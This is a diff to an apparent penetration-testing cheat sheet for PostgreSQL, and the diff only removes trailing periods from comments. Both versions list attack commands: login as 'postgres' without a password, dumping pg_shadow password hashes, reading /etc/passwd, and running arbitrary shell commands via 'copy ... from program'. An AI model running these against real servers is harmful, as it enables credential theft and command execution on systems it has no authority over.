@@ -132,21 +132,21 @@ select username, passwd from pg_shadow;
 select current_database();
 create table test (input TEXT); copy test from '/etc/passwd'; select input from test;
 
-psql -U postgres -h <IP>                     # Login with user 'postgres' and no password.
-\l                                           # List databases.
-\du                                          # List database users.
-select pg_ls_dir('/etc');                    # List directory contents of /etc.
-\c postgres                                  # Connect to the 'postgres' db.
-\d                                           # List of tables.
+psql -U postgres -h <IP>                     # Login with user 'postgres' and no password
+\l                                           # List databases
+\du                                          # List database users
+select pg_ls_dir('/etc');                    # List directory contents of /etc
+\c postgres                                  # Connect to the 'postgres' db
+\d                                           # List of tables
 
-create table tmp(data text);                 # Create a table called 'tmp'.
-copy tmp(data) from program 'ls -l /home';   # Run a command in the shell and save the output.
-select * from tmp;                           # Print the contents of the table.
+create table tmp(data text);                 # Create a table called 'tmp'
+copy tmp(data) from program 'ls -l /home';   # Run a command in the shell and save the output
+select * from tmp;                           # Print the contents of the table
 
 copy tmp from '/etc/passwd';
 select * from tmp;
 
-delete from tmp;                             # Clear the table.
+delete from tmp;                             # Clear the table
 
 Replace 'ls -l /home' with whatever command you'd like to run.
 drop table tmp;
